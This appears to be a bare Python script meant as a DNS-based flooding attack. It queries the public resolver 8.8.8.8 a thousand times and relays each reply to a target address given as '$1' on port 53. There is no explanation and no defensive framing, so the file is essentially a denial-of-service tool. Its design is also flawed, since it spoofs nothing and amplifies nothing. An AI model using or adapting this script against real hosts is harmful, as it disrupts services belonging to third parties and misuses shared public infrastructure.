import socket

target_ip = '$1'
target_port = 53

dns_request = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x10\x00\x01'
dns_resolver_ip = '8.8.8.8'

for i in range(1000):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(dns_request, (dns_resolver_ip, 53))
    response = client_socket.recvfrom(1024)
    client_socket.close()

    target_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_socket.sendto(response[0], (target_ip, target_port))
    target_socket.close()

